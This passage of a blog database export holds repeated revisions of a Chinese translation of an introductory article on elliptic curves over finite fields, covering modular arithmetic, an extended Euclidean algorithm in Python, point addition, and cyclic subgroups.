href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或\\\"ji'dian\\\"\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277443694,"created_at":"2019-12-25 12:37:23"},{"id":"5e03580f2ee0ee0001819d33","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 上的两个整数.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/elliptic-curves-mod-p.png\",\"caption\":\"\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n以上是当 p = 19, 97, 127, 487 时, 曲线 $y^2 \\\\equiv x^3 - 7x + 10 \\\\pmod{p}$ 的图形. 注意, 在每个 x 坐标上最多有2个点, 且整个图形关于 $y = p / 2$ 水平对称.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/singular-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n 曲线 $y^2 \\\\equiv x^3 \\\\pmod{29}$ 是奇异的并且在有三个点落在 (0,0) 上. 这样的曲线就不是有效的椭圆曲线\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n之前连续的曲线现在变成了xy平面上一些离散的点的集合. 然而我们还是能证明, 即使我们限制了曲线的域, <strong>这个在 $\\\\mathbb{F}_p$ 上的椭圆曲线仍然是一个阿贝尔群</strong>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 点加\"}],[\"html\",{\"html\":\"<p>\\n显然, 为了让加法在 $\\\\mathbb{F}_p$ 上仍然有效, 我们需要稍微调整一下定义. 在实数域上, 我们说位于一条直线上的三点之和为0($P + Q + R = 0$). 我们可以保留这个定义, 但是在 $\\\\mathbb{F}_p$ 上三点连成一线是什么意思呢?\\n</p>\\n\\n<p>\\n    我们说<strong>当有一条直线能将三个点连起来时, 三点就位于一条直线上.</strong> 当然, $\\\\mathbb{F}_p$(有限域)上的直线和$\\\\mathbb{R}$(实数域)上的直线是不一样的. 通俗的说, $\\\\mathbb{F}_p$ 上的直线是指满足方程 $ax + by + c \\\\equiv 0 \\\\pmod{p}$ 的所有点 $(x, y)$ 的集合(即加上 \\\"$(\\\\text{mod}\\\\ p)$\\\" 的标准直线方程).\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/point-addition-mod-p.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  上图为曲线 $y^2 \\\\equiv x^3 - x + 3 \\\\pmod{127}$ 上 点$P = (16, 20)$ 和 点$Q = (41, 120)$ 的加法. 看看直线$y \\\\equiv 4x + 83 \\\\pmod{127}$是如何通过在平面上不断\\\"重复\\\"出现将这些点连接起来的.\\n</p>\"}],[\"html\",{\"html\":\"<p>\\n   既然我们在一个群里, 那么点加就具有以下这些我们已知的属性: \\n  <ul>\\n    <li> $Q + 0 = 0 + Q = Q$ (根据单位元的定义可得) </li>\\n    <li> 已知一个非零点 Q , 其逆元 -Q 将具有与之相同的横坐标和相反的纵坐标. 或者, 也可以表示成 $-Q = (x_Q, -y_Q \\\\bmod{p})$. 例如, $\\\\mathbb{F}_{29}$ 上的曲线上有一点 Q = (2, 5), 该点的逆元 $-Q = (2, -5 \\\\bmod{29}) = (2, 24)$ </li>\\n    <li> 还有, $P + (-P) = 0$ (根据逆元的定义) </li>\\n  </ul>\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 代数求和\"}],[\"html\",{\"html\":\"<p>\\n    这里计算点加的方程与在前一篇文章里讲的完全一样, 除了我们需要再每个方程末尾加上 $\\\\text{mod}\\\\ p$. 所以, 已知 $P = (x_P, y_P)$, $Q = (x_Q, y_Q)$ 和 $R = (x_R, y_R)$, 我们可以通过以下方法计算 $P + Q = -R$:\\n    $$\\n    \\\\begin{array}{rcl}\\n  x_R & = & (m^2 - x_P - x_Q) \\\\bmod{p} \\\\\\\\\\n  y_R & = & [y_P + m(x_R - x_P)] \\\\bmod{p} \\\\\\\\\\n  & = & [y_Q + m(x_R - x_Q)] \\\\bmod{p}\\n\\\\end{array}\\n    $$\\n    当 $P \\\\ne Q$, 斜率 m 可以表示为:\\n    $$ m = (y_P - y_Q)(x_P - x_Q)^{-1} \\\\bmod{p} $$\\n    而当 $P = Q$, 可得: \\n    $$ m = (3 x_P^2 + a)(2 y_P)^{-1} \\\\bmod{p} $$\\n</p>\\n\\n<p>\\n  上面的方程没有任何变化并非是一个巧合: 事实上, 这些方程在任何域下都是成立的, 无论是有限域还是非有限域(需要排除$\\\\mathbb{F}_2$ 和 $\\\\mathbb{F}_3$ 这两种特殊情况). 我似乎应该为这个说法提供一些依据, 不过问题在于: 关于群论的证明总会涉及到各种复杂的数学概念. 不过, 我还是找到了一个只使用初等数学概念推导论证的<a href=\\\"https://www.uni-regensburg.de/Fakultaeten/nat_Fak_I/friedl/papers/elliptic_2017.pdf\\\">来自Stefan Friedl的证明</a>. 如果你对为什么这些方程在(几乎)所有域中都能成立感兴趣的话可以前往阅读.\\n</p>\\n\\n<p>\\n    回到我们的话题, 我们不会定义一个几何意义的方法了: 事实上这会比较麻烦. 比如说, 在前一篇文章中我们说要计算 $P + P$ 需要在曲线上做一条过 P 点的切线. 但如果曲线不是连续的, \\\"切线\\\"这个词是没有意义的. 我们可以深入研究这个问题,不过这种几何式的方法确实太复杂和难以实践了.\\n</p>\\n\\n<p>\\n   不过, 你可以试试这个计算点加的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-add.html\\\">交互式小工具</a>.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 椭圆曲线群的阶\"}],[\"html\",{\"html\":\"<p>\\n  我们说有限域上的椭圆曲线由有限个点组成. 那么我们需要回答一个重要的问题: 到底有多少个点呢?\\n</p>\\n\\n<p>\\n    首先, 我们说群里点的数量叫做这个群的阶.\\n</p>\\n\\n<p>\\n    从 0 到 p-1 逐个尝试所有可能的值显然是不切实际的, 这样需要经过 $O(p^2)$ 次尝试, 如果 p 是一个非常大的质数, 这样做的将会很\\\"困难\\\".\\n</p>\\n\\n<p>\\n   幸好, 我们还有一种更快的算法来计算群的阶: <a href=\\\"https://en.wikipedia.org/wiki/Schoof%27s_algorithm\\\">Schoof's 算法</a>. 我们不会深入介绍这个算法的细节 -- 我们只需要知道, 这个算法的时间复杂度为多项式级别.\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 标量乘法和循环子群\"}],[\"html\",{\"html\":\"<p>\\n    在实数域中, 乘法可以通过如下方式定义: \\n    $$\\n    n P = \\\\underbrace{P + P + \\\\cdots + P}_{n\\\\ \\\\text{times}}\\n    $$\\n    然后, 我们可以通过<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication\\\">倍加法</a>通过 $O(\\\\log n)$ 步(或者  $O(k)$, k为数字的位长)得出结果. 这里也有一个计算标量乘法的<a href=\\\"https://andrea.corbellini.name/ecc/interactive/modk-mul.html\\\">交互式工具</a>.\\n</p>\\n\\n<p>\\n   离散域 $\\\\mathbb{F}_p$ 上的椭圆曲线乘法有一个有趣的属性, 当已知曲线 $y^2 \\\\equiv x^3 + 2x + 3 \\\\pmod{97}$ 和 点 $P = (3, 6)$, 现在计算点 P 的(标量)乘积.\\n</p>\"}],[\"image\",{\"src\":\"/content/images/2019/12/cyclic-subgroup.png\"}],[\"html\",{\"html\":\"<p style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n  点 $P = (3, 6)$ 的乘积总共只有 5 个点(0, P, 2P, 3P, 4P) 这些点不断循环出现. 容易看出椭圆曲线上的标量乘法和模运算加法是比较相似的.\\n</p>\"}],[\"markdown\",{\"markdown\":\"* 0P = 0\\n* 1P = (3, 6)\\n* 2P = (80, 10)\\n* 3P = (80, 87)\\n* 4P = (3, 91)\\n* 5P = 0\\n* 6P = (3, 6)\\n* 7P = (80, 10)\\n* 8P = (80, 87)\\n* 9P = (3, 91)\\n* ...\\n\\n我们马上可以发现两件事: 首先, P的乘积只有5个值, 曲线上其他任何点都没有出现. 其二, 这些点反复循环出现. 我们可以写成: \\n\\n* 5kP = 0\\n* (5k+1)P = P\\n* (5k+2)P = 2P\\n* (5k+3)P = 3P\\n* (5k+4)P = 4P\"}],[\"html\",{\"html\":\"<p>\\n  上面5个方程实际上还可以压缩成一个, 多亏有模运算: $kP = (k \\\\bmod{5})P$\\n</p>\\n\\n<p>\\n    不仅如此, 我们还可以验证到<strong>这五个点在加法运算下是封闭的</strong>. 这意味着: 无论我把 0, P, 2P, 3P, 4P 怎么加, 得到的结果总是这五个点之一. 再次强调, 椭圆曲线上其他任何的点都不会出现在结果中.\\n</p>\\n\\n<p>\\n  不仅仅是P = (3, 6)这个点, 上述规律对曲线上的任何点都是成立的. 当我们把 P 看做一个通用的点: \\n    $$\\n    nP + mP = \\\\underbrace{P + \\\\cdots + P}_{n\\\\ \\\\text{times}} + \\\\underbrace{P + \\\\cdots + P}_{m\\\\ \\\\text{times}} = (n + m)P\\n    $$\\n  这意味着, 如果我们将 P 的两个乘积相加, 将会得到 P 的另一个乘积 (P的乘积在加法运算下是封闭的). 这足以<a href=\\\"https://en.wikipedia.org/wiki/Subgroup#Basic_properties_of_subgroups\\\">证明</a><strong>P的乘积的集合是椭圆曲线群的一个循环子群.</strong>\\n</p>\\n\\n<p>\\n  \\\"子群\\\"是指另一个群的子集构成的群. 而\\\"循环子群\\\"是指群里的元素反复循环出现的子群, 正如前面的例子中所展示的. 点 P 则叫做这个循环子群的 <strong>生成点</strong>或<strong>基点</strong>\\n</p>\"}]],\"markups\":[],\"sections\":[[10,0],[10,1],[10,2],[10,3],[10,4],[10,5],[10,6],[10,7],[10,8],[10,9],[10,10],[10,11],[10,12],[10,13],[10,14],[10,15],[10,16],[10,17],[10,18],[10,19],[10,20],[10,21],[10,22],[10,23],[10,24],[10,25],[10,26],[10,27],[10,28],[10,29],[1,\"p\",[]]]}","created_at_ts":1577277455725,"created_at":"2019-12-25 12:37:35"},{"id":"5e0358142ee0ee0001819d35","post_id":"5e0067842ee0ee000181987b","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and 